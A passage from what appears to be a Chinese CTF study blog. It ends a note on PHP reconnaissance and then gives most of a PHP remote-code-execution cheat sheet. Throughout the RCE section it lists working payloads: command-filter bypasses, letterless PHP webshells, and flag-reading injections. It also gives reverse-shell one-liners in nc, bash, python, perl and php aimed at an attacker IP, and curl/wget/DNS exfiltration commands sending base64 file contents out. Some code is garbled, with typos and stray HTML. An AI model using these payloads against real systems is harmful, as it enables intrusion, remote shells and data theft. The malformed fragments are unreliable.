</ul>
</li>
</ul>
<hr>
<h1 id="phpinfo-页面"><a href="#phpinfo-页面" class="headerlink" title="phpinfo 页面"></a>phpinfo 页面</h1><ul>
<li>PHP 版本信息<ul>
<li>重要性: 通过了解PHP的具体版本，你可以查找该版本已知的漏洞。不同PHP版本可能存在不同的安全问题，例如远程代码执行、文件包含漏洞等。</li>
<li>如何利用: 查找并利用该PHP版本的CVE（Common Vulnerabilities and Exposures）漏洞。例如，较旧版本的PHP可能存在未修复的远程代码执行漏洞。</li>
<li>位置: <code>phpinfo()</code> 输出的顶部通常显示 <code>PHP Version</code> 字段。</li>
</ul>
</li>
<li>加载的PHP模块<ul>
<li>重要性: 加载的模块揭示了服务器支持的功能。例如，curl模块允许网络请求，gd模块提供图像处理功能。某些模块可能引入额外的攻击向量。</li>
<li>如何利用: 通过加载的模块，可以识别出特定模块的漏洞并利用它们。例如，openssl模块的配置可能存在安全隐患。</li>
<li>位置: <code>phpinfo()</code> 页面</li>
</ul>
</li>
</ul>
<hr>
<h1 id="文件上传的探测"><a href="#文件上传的探测" class="headerlink" title="文件上传的探测"></a>文件上传的探测</h1><ul>
<li>功能: 使用一些在线或自建的测试脚本，探测是否允许文件上传。</li>
<li>使用方法:<ul>
<li>尝试上传不同类型的文件（如.php, .jpg）并观察服务器响应。</li>
<li>使用Web应用测试工具（如OWASP ZAP）中的文件上传探测功能。</li>
</ul>
</li>
<li>结果: 通过响应状态码或文件路径的返回，判断文件上传的成功与否及其可能的利用方式。</li>
</ul>
<hr>
<h1 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h1><ul>
<li>功能: Nikto是一款开源的Web服务器扫描器，用于检测Web服务器的漏洞和配置问题。</li>
<li>使用方法:<ul>
<li><code>nikto -h http://example.com</code></li>
</ul>
</li>
<li>结果: 能够发现服务器暴露的敏感文件、配置文件和其他潜在漏洞，并显示PHP版本等信息。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/" data-id="cm0kx5k5j001po8dk7rmb9qsh" data-title="文件操作篇" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-rce总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/09/01/rce%E6%80%BB%E7%BB%93/" class="article-date">
  <time class="dt-published" datetime="2024-09-01T06:42:00.000Z" itemprop="datePublished">2024-09-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/09/01/rce%E6%80%BB%E7%BB%93/">rce总结</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><ul>
<li>assert() </li>
<li>preg_replace(a,b,c) :c中被a的要求匹配时。匹配部分以b(此时执行)替换</li>
<li>create_function </li>
<li>动态调用：变量当做函数用</li>
<li>回调函数 call_user_func(a,b) 例子：a:assert（不能是eval或是echo这种语言结构），b:$GET_[‘cmd’]<ul>
<li>call_user_func_array(a,b) b是数组数组中的元素会按照顺序依次作为参数传递给指定的函数或方法<ul>
<li>例如：function add($x, $y) $params &#x3D; [2, 3];$result &#x3D; call_user_func_array(‘add’, $params);</li>
</ul>
</li>
<li>array_filter(a,b) a数组b函数</li>
<li>array_map(a,b)  a函数b数组</li>
<li>${php代码}</li>
</ul>
</li>
</ul>
<h2 id="paylpd：eval-传入字符串解释其为php代码执行"><a href="#paylpd：eval-传入字符串解释其为php代码执行" class="headerlink" title="paylpd：eval()传入字符串解释其为php代码执行"></a>paylpd：eval()传入字符串解释其为php代码执行</h2><ul>
<li>转接头写法：eval($GET_[1])    访问…&#x2F;?1&#x3D;eval($POET_[1]);链接蚁剑<ul>
<li>…&#x2F;?1&#x3D;$a&#x3D;’sys’;$b&#x3D;’tem’;$c&#x3D;$a.$b;$c($POST_[1])		post：1&#x3D;ls &#x2F;</li>
<li><?`$_GET[1]`;&1=nc 43.323.323.2323 4444 -e /bin/bash    攻击方：nc -lvnp 4444
- bash -i >& /dev/tcp/<攻击者IP>/4444 0>&1
- python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<攻击者IP>",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'
- perl -e 'use Socket;$i="<攻击者IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
- php -r '$sock=fsockopen("<攻击者IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</li>
<li>经典读文件函数<ul>
<li>file_get_contents()</li>
<li>highlight_file()</li>
<li>fopen()</li>
<li>readfile()</li>
<li>fread()</li>
<li>fgetss()</li>
<li>fgets()</li>
<li>parse_ini_file()</li>
<li>show_source()</li>
<li>file()</li>
<li>var_dump(scandir(‘&#x2F;‘));	</li>
<li>&#x2F;var&#x2F;www&#x2F;html&#x2F;</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul>
<li>位点：	system(“”)	里面写命令liunx，保证让系统看出是字符串<ul>
<li>passthru</li>
<li>exec</li>
<li>shell_exec没有回显的执行函数或者设置&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1等无回显</li>
<li>popen</li>
<li>pcntl_exec</li>
</ul>
</li>
<li>liunx系统操作：<ul>
<li>find &#x2F; -name flag*  &#x2F;&#x2F;没有flag。没关系我们用<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-find.html">find</a>命令从根目录开始找。</li>
<li>pwd: 显示当前工作目录的路径。</li>
<li>ls: 列出当前目录中的文件和目录。<ul>
<li>ls -l  # 显示详细信息</li>
<li>ls -a  # 显示隐藏文件</li>
<li>ls -la合体</li>
</ul>
</li>
<li>cd: 切换目录。<ul>
<li>cd ..  # 返回上一级目录</li>
<li>cd ~  # 返回用户主目录</li>
</ul>
</li>
<li>cp: 复制文件或目录。<ul>
<li>cp source_file destination_file  # 复制文件</li>
<li>cp -r source_directory destination_directory  # 复制目录</li>
</ul>
</li>
<li>mv: 移动或重命名文件和目录。<ul>
<li>mv old_name new_name  # 重命名文件或目录</li>
<li>mv file_name &#x2F;path&#x2F;to&#x2F;directory  # 移动文件</li>
</ul>
</li>
<li>rm: 删除文件或目录<ul>
<li>rm file_name  # 删除文件</li>
<li>rm -r directory_name  # 删除目录</li>
</ul>
<p>				</p>
</li>
<li>mkdir: 创建新目录。					<ul>
<li>mkdir new_directory</li>
</ul>
</li>
<li>rmdir: 删除空目录。<ul>
<li>rmdir directory_name</li>
</ul>
</li>
<li>cat: 显示文件内容。<ul>
<li>cat file_name</li>
</ul>
<p>					</p>
</li>
<li>more: 分页显示文件内容<ul>
<li>more file_name</li>
</ul>
</li>
<li>less: 分页显示文件内容，支持向前滚动。<ul>
<li>less file_name</li>
</ul>
</li>
<li>head: 显示文件的前几行。<ul>
<li>head file_name</li>
<li>head -n 10 file_name  # 显示文件的前10行</li>
</ul>
</li>
<li>显示文件的后几行</li>
<li>tail: 显示文件的后几行。<ul>
<li>tail file_name</li>
<li>tail -n 10 file_name  # 显示文件的后10行</li>
</ul>
</li>
<li>nano: 简单的文本编辑器。<ul>
<li>nano file_name</li>
</ul>
</li>
<li>功能强大的文本编辑器</li>
<li>vi 或 vim: 功能强大的文本编辑器。<ul>
<li>vi file_name</li>
<li>vim file_name</li>
</ul>
</li>
<li>top: 动态显示系统的运行信息，包括进程、CPU、内存使用情况。<ul>
<li>ps aux  # 显示所有进程的详细信息</li>
</ul>
</li>
<li>kill: 终止进程。<ul>
<li>kill process_id  # 终止指定进程</li>
<li>kill -9 process_id  # 强制终止指定进程</li>
</ul>
</li>
<li>df: 显示文件系统的磁盘使用情况。<ul>
<li>df</li>
<li>df -h  # 以人类可读的方式显示</li>
</ul>
</li>
<li>du: 显示目录或文件的磁盘使用情况。<ul>
<li>du -h  # 以人类可读的方式显示</li>
<li>du -sh directory_name  # 显示目录总大小</li>
</ul>
</li>
<li>ping: 测试网络连接。<ul>
<li>ping hostname_or_ip</li>
</ul>
</li>
<li>ifconfig: 显示或配置网络接口（需要root权限）。<ul>
<li>ifconfig</li>
<li>显示网络连接、路由表、接口状态等</li>
</ul>
</li>
<li>netstat: 显示网络连接、路由表、接口状态等。<ul>
<li>netstat</li>
<li>netstat -an  # 显示所有连接</li>
</ul>
</li>
<li>ssh: 通过SSH协议远程登录。<ul>
<li>ssh user@hostname_or_ip</li>
<li>通过SSH协议传输文件</li>
</ul>
</li>
<li>scp: 通过SSH协议传输文件。<ul>
<li>scp local_file user@hostname_or_ip:&#x2F;path&#x2F;to&#x2F;remote_directory</li>
<li>scp user@hostname_or_ip:&#x2F;path&#x2F;to&#x2F;remote_file local_directory</li>
</ul>
</li>
<li>nc: 建立TCP连接。<ul>
<li>nc <hostname> <port></li>
<li>nc localhost 80  # 连接到本地的80端口</li>
</ul>
</li>
<li>nc: 监听TCP端口。<ul>
<li>nc -l -p <port></li>
<li>nc -l -p 1234  # 监听本地的1234端口</li>
</ul>
</li>
<li>发送文件：<ul>
<li>nc <hostname> <port> &lt; <file></li>
<li>nc remote_host 1234 &lt; file.txt  # 将file.txt发送到远程主机的1234端口</li>
</ul>
</li>
<li>接收文件：			<ul>
<li>nc -l -p <port> &gt; <file></li>
<li>nc -l -p 1234 &gt; received_file.txt  # 在本地监听1234端口并接收文件到received_file.txt</li>
</ul>
</li>
<li>nc: 端口扫描。<ul>
<li>nc -zv <hostname> <start_port>-<end_port></li>
<li>nc -zv localhost 80-100  # 扫描本地的80到100端口</li>
</ul>
</li>
<li>Curl (curl)				<ul>
<li>curl: 下载文件。<ul>
<li>curl -O <URL></li>
<li>curl -O <a target="_blank" rel="noopener" href="http://example.com/file.txt">http://example.com/file.txt</a>  # 下载一个文件</li>
</ul>
</li>
<li>curl: 上传文件。<ul>
<li>curl -T <file> <URL></li>
<li>curl -T file.txt <a href="ftp://ftp.example.com/">ftp://ftp.example.com/</a>  # 将file.txt上传到FTP服务器</li>
<li>发送GET请求</li>
</ul>
</li>
<li>curl: 发送GET请求。				<ul>
<li>curl <URL></li>
<li>curl <a target="_blank" rel="noopener" href="http://api.example.com/data">http://api.example.com/data</a>  # 发送</li>
</ul>
</li>
</ul>
</li>
<li>sh命令会将文件中的内容当作命令来执行</li>
<li>执行命令时，可以在没有写完的命令后面加\，实现将一条命令多行化，以行末没有\为终止，如下相当于执行了cat flag.txt</li>
<li>ca\     t f\      lag.\  txt</li>
<li>linux中,利用rev可将文件内容倒置，同时可以配合&gt;,*使用echo ‘123456’ &gt; test.txt：创建文件 test.txt 并写入内容 123456。</li>
<li>rev test.txt：反转文件 test.txt 的内容，输出 654321。</li>
<li>输入 * 并按回车：Shell 将 * 展开为 rev test.txt 并执行，输出 654321。</li>
<li><ul>
<li><blockquote>
<p>a.txt：Shell 将 * 展开为 rev test.txt 并执行，将输出重定向到 a.txt。</p>
</blockquote>
</li>
</ul>
</li>
<li>cat a.txt：查看 a.txt 文件的内容，输出 654321。</li>
<li><blockquote>
<p>rev：创建一个空文件名为 rev 的文件，如果 rev 文件已经存在，则会清空其内容。</p>
</blockquote>
</li>
<li>linux中,dir命令和ls效果基本一样，只有配合重定向符写入文件时有一些差别，ls写入文件中时，每个文件名都是单独一行，它会自动换行，有时会影响到我们的命令执行，而dir会把内容全部写入一行中，同时会自动补全空格</li>
</ul>
</li>
</ul>
<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><ul>
<li>符号<ul>
<li>;联合执行 </li>
<li>||或  绕过黑洞</li>
<li>&amp;&amp;与</li>
<li>|传到</li>
<li>?不确定</li>
<li>*通配</li>
<li>. &gt;命令会将原有文件内容覆盖，&gt;&gt;会将字符串添加到文件内容末尾，不会覆盖原有的内容</li>
</ul>
</li>
</ul>
<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ul>
<li><p>空格   ${IFS}     $IFS$9     %09 </p>
<p>​         在env或者printenv环境变量里找空格system(env | grep ‘ ‘)得到MYVAR&#x3D;hello world${MYVAR:5:1} 或者echo@123表示即使123出错也不要报错，echo~123取反  </p>
</li>
<li><p>cat过滤</p>
<ul>
<li>echo base64命令|base64 -d|sh 		   </li>
<li>echo hex命令|xxd -r -p|sh </li>
<li>换成 fmt more less rev ca\t</li>
</ul>
</li>
<li><p>关键字过滤</p>
<ul>
<li>插入反斜线 ca\t     贴贴’c’’a’’t’  ${}拼凑关键词  插入空ca’’t</li>
<li>对于匹配文件名用通配符[a-s]</li>
<li>设置变量 cmd&#x3D;ab;a&#x3D;l;b&#x3D;s;$a$b</li>
</ul>
</li>
<li><p>禁用;</p>
<ul>
<li>||代替</li>
</ul>
</li>
</ul>
<h2 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h2><ul>
<li>preg_replace(‘&#x2F;[a-z]+((?R)?)&#x2F;‘虽然只允许无参数，但是允许函数套用。</li>
<li>获得flag.php<ul>
<li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}</li>
<li>c&#x3D;$d&#x3D;opendir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d))){echo”$f\n”;}</li>
<li>c&#x3D;$d&#x3D;dir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;$d-&gt;read())){echo$f.”\n”;}</li>
<li>print_r(glob(“*”)); &#x2F;&#x2F; 列当前目录</li>
<li>print_r(glob(“&#x2F;*”)); &#x2F;&#x2F; 列根目录</li>
<li>scandir(‘.’): &#x2F;&#x2F;获得目录 <ul>
<li>取出. <ul>
<li>current(localeconv())</li>
<li>char(46)&gt;&gt;char(rand())    &#x2F;&#x2F;超多次重放</li>
<li>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))	&#x2F;&#x2F;php7</li>
</ul>
</li>
<li>操作数组：<ul>
<li>pos() current()第一个元素</li>
<li>end()- 将内部指针指向数组中的最后一个元素，井输出</li>
<li>next()- 将内部指针指向数组中的下一个元素，并输出</li>
<li>prev()- 将内部指针指向数组中的上一个元素，并输出</li>
<li>reset()- 将内部指针指向敌组中的第一个元素，井输出</li>
<li>each()— 返回当前元素的键名和键值，井将内部指针向前移动</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>取出文件<ul>
<li>如果flag-php在最后一个，直接用end（）取出即可。</li>
<li>(1)array_reverse()	&#x2F;&#x2F;转置数组<ul>
<li>仅限于flag.php在数组的倒数第二个位置这种悄况下。</li>
<li>?exp&#x3D;print_r(next(array_reverse(scandir(pos(localeconv()))))):</li>
</ul>
</li>
<li>(2)array_rand(array_flip()) &#x2F;&#x2F;filp键值互换，rand随机取键<ul>
<li>flag.php位置在哪都可以，但是他不是100%成功的，需要重放．概率问题</li>
<li>?exp&#x3D;print_r(array_rand(array_flip(scandir(pos(localeconv())))));</li>
</ul>
</li>
</ul>
</li>
<li>session_id(session_star())   更改cookie：PHPSESSID&#x3D;flag.php	&#x2F;&#x2F;字符串有长度限制,相当于想写啥就写啥命令不能有空格，因为cookie不解析空格</li>
<li>end(getallheaders())     &#x2F;&#x2F;得到http包最后字符串，得到任意字符串,甚至可以命令执行，套进system等函数</li>
<li>取get的最后一个参数       end(pos(get_defined_vars()))       </li>
<li>取post的最后一个参数      end(next(get_defined_vars()))      记得bp发包<ul>
<li>读取flag.php<ul>
<li>文件读取的方法<ul>
<li>var_dump(file_get_contents())</li>
<li>show_source()</li>
<li>highlight_file()</li>
<li>readfile()</li>
</ul>
</li>
<li>命令执行的方法	<ul>
<li>system(end(next(get_defined_vars())))     post传字符串传入 cat flag.php</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="无字母RCE"><a href="#无字母RCE" class="headerlink" title="无字母RCE"></a>无字母RCE</h2><ul>
<li>php5	<ul>
<li>异或  post传 _&#x3D;phpinfo<ul>
<li>assert($<em>POST[</em>])	</li>
<li><pre><code class="php">&lt;?php
$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); $___=$$__;$_($___[_]);
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 取反  post传   2=phpinfo</span><br><span class="line">  - ```php</span><br><span class="line">    &lt;?php</span><br><span class="line">    $__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);$_=$__/$__;$____=&#x27;&#x27;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#x27;_&#x27;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
<li>递增运算 post传	_&#x3D;phpinfo<ul>
<li><pre><code class="php">&lt;?php
$_=[];$_=@&quot;$_&quot;; $_=$_[&#39;!&#39;==&#39;@&#39;]; $___=$_; $__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; $___.=$__; $__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$_=$$____;$___($_[_]); 
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- php7</span><br><span class="line">  - 取反脚本/异或脚本+动态调用</span><br><span class="line">    - 如(&#x27;phpinfo‘//取反结果)();	(&#x27;system//需要变化&#x27;)(ls/ls -la)</span><br><span class="line">    - ```php</span><br><span class="line">      $a=&#x27;phpinfo&#x27;;</span><br><span class="line">      $a();</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="通过临时文件代码执行"><a href="#通过临时文件代码执行" class="headerlink" title="通过临时文件代码执行"></a>通过临时文件代码执行</h2><ul>
<li>强制上传表单.php中随便上传,txt文件<ul>
<li>POST &#x2F;?cmd&#x3D;.+&#x2F;???&#x2F;???????[@-[]? HTTP&#x2F;1.1</li>
<li>…</li>
<li>ls &#x2F;</li>
</ul>
</li>
</ul>
<h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><ul>
<li>反弹shell<ul>
<li>nc 43.323.323.2323 4444 -e &#x2F;bin&#x2F;bash    攻击方：nc -lvnp 4444</li>
<li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&lt;攻击者IP&gt;&#x2F;4444 0&gt;&amp;1</li>
<li>python -c ‘import socket,subprocess,os; s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((“&lt;攻击者IP&gt;”,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p&#x3D;subprocess.call([“&#x2F;bin&#x2F;bash”,”-i”]);’</li>
<li>perl -e ‘use Socket;$i&#x3D;”&lt;攻击者IP&gt;”;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“&#x2F;bin&#x2F;sh -i”);};’		</li>
<li>php -r ‘$sock&#x3D;fsockopen(“&lt;攻击者IP&gt;”,4444);exec(“&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li>
</ul>
</li>
<li>curl&#x2F;wget外带数据 :<ul>
<li>首先在自己的公网ip的网站目录下建立一个record.php的文件，里面写下如下代码：</li>
<li>开始构造请求（读取不全的话可以进行编码<code>cat flag|base64</code>）：</li>
<li>curl http:&#x2F;&#x2F;<em>.</em>.*.**&#x2F;record.php?data&#x3D;<code>cat flag|base64</code></li>
<li>wget http:&#x2F;&#x2F;<em>.</em>.<em>.</em>&#x2F;record.php?data&#x3D;<code>cat flag|base64</code></li>
<li>执行结果无回显，通过burpsuite的Collaborator 服务器记录，利用<code>curl</code>将执行结果带出来，exp如下</li>
<li><a href="http://IP:PORT/?cmd=curl%20http://g3k199o7dxxxhsfg6mwal.burpcollaborator.net/?cmd=`cat%20/flag|base64`">http://IP:PORT/?cmd=curl%20http://g3k199o7dxxxhsfg6mwal.burpcollaborator.net/?cmd=`cat%20/flag|base64`</a></li>
</ul>
</li>
<li>dnslog:<ul>
<li>?cmd&#x3D;<code>sed -n &quot;3.4p&quot;fla?.php|base64</code>;curl ${a:10:30}.&lt;替换的dnslog&gt;</li>
</ul>
</li>
<li>echo写shell或者cat flag &gt; test或者cp flag test等	</li>
<li>我们可以使用$(sleep%091)来测试命令是否成功执行</li>
<li>可以看到sleep 1，成功的使得页面延时了1秒返回。但是对于$(ls)，我们是无法看到回显的。这是因为使用$(ls)会把ls命令执行的结果作为参数传递给ping，ping将其作为域名进行解析，但是无法得到结果，因此把域名解析失败的错误输出到错误输出中，但php的system函数只输出了标准输出的内容，没有输出标准错误，因为我们无法看到结果。</li>
<li>我们可以通过重定向标准错误到标准输出中，来让system函数输出错误回显，获取我们注入命令的结果。在sh中，错误描述符的编号是2，因此通过2&gt;&#x2F;dev&#x2F;stdout就可以把错误重定向到标准输出中。</li>
<li>完整的命令为”$(ls%09&#x2F;)”%092&gt;&#x2F;dev&#x2F;stdout，该命令可以列举根目录的文件。这里双引号的作用是，ls的输出会产生换行，导致ping只会将第一个结果作为错误输出出来，因此套在双引号内部，可以将结果全部回显。</li>
</ul>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><ul>
<li>eval($c)	&#x2F;&#x2F;eval(“var_dump($code)”);类似于这种注意闭合<ul>
<li>查看当前目录<ul>
<li>c&#x3D;print_r(scandir(dirname(‘<strong>FILE</strong>‘)));</li>
<li>print_r(scandir(dirname(<strong>FILE</strong>)));</li>
<li>c&#x3D;system(“ls”);</li>
</ul>
</li>
<li>再看根<ul>
<li>c&#x3D;print_r(scandir(‘&#x2F;‘));</li>
<li>c&#x3D;var_export(scandir(‘&#x2F;‘));</li>
<li>c&#x3D;var_dump(glob(‘&#x2F;*’));</li>
<li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}die(); &#x2F;&#x2F;有open_basedir限制</li>
</ul>
</li>
<li>读取flag<ul>
<li>?c&#x3D;system($_GET[‘a’]);&amp;a&#x3D;cat flag.php;</li>
<li>?c&#x3D;echo <code>cat fl&#39;&#39;ag.php</code>;</li>
<li>?c&#x3D;highlight_file(next(array_reverse(scandir(“.”))));</li>
<li>?c&#x3D;eval(end(current(get_defined_vars())));&amp;a&#x3D;system(“cat flag.php”);</li>
<li>?c&#x3D;passthru(‘cat &#x2F;flag_is_her3’);</li>
<li>?c&#x3D;a&#x3D;g;cat$IFS$1fla$a.php</li>
<li>?c&#x3D;system(“cat fl*g.php”);</li>
<li>?c&#x3D;system(“tac fl*g.php”);</li>
<li>?c&#x3D;print_r(file(‘flag.php’));</li>
<li>?c&#x3D;var_dump(file(‘flag.php’));</li>
<li>?%20num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))  &#x2F;&#x2F;对应char脚本</li>
<li>?c&#x3D;exec(%27cat%20&#x2F;flag_is_her3%27,$array);var_dump($array);</li>
<li>?c&#x3D;readfile(“flag.php”);</li>
<li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgets($a);echo $line;}        &#x2F;&#x2F;一行一行读取</li>
<li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgetc($a);echo $line;} 		&#x2F;&#x2F;一个一个字符读取</li>
<li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgetcsv($a);var_dump($line);}</li>
<li>?c&#x3D;system(“cp fl*g.php a.txt “); 访问&#x2F;a.txt</li>
<li>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac%20f*');?></li>
<li>?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls /');?></li>
<li>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;       &#x2F;&#x2F;(<?php system("tac flag.php");?>)</li>
<li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</li>
<li>?c&#x3D;&#x2F;bin&#x2F;ca?${IFS}f???????</li>
<li>?c&#x3D;&#x2F;???&#x2F;????64%20????.???  # &#x2F;bin&#x2F;base64 flag.php</li>
<li>?c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????????  # &#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php</li>
<li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while($b&#x3D;fgets($a)){echo $b;}</li>
<li>?c&#x3D;system(‘echo -e “ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); “ &gt; a.php’);  访问&#x2F;a.php?c&#x3D;system(“tac flag.php”);</li>
<li>?c&#x3D;system(“cat fl*g.php | grep  -E ‘fl.g’ “);</li>
</ul>
</li>
<li>无所谓，文件包含会出手<ul>
<li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;不用分号</li>
<li>GET：?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</li>
<li>POST：<?php system('tac flag.php');?></li>
<li>c&#x3D;include(‘flag.php’);echo $flag;</li>
<li>c&#x3D;include($_GET[‘1’]); ?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</li>
<li>c&#x3D;include(‘flag.php’);var_dump(get_defined_vars());		&#x2F;&#x2F;var_dump:输出注册变量&#x2F;&#x2F;get_defined_vars():函数返回由所有已定义变量所组成的数组</li>
<li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());</li>
<li>c&#x3D;include(“&#x2F;flag.txt”);$ss&#x3D;ob_get_contents();ob_end_clean();echo $ss;</li>
<li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());exit();</li>
<li>或者</li>
<li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());die();</li>
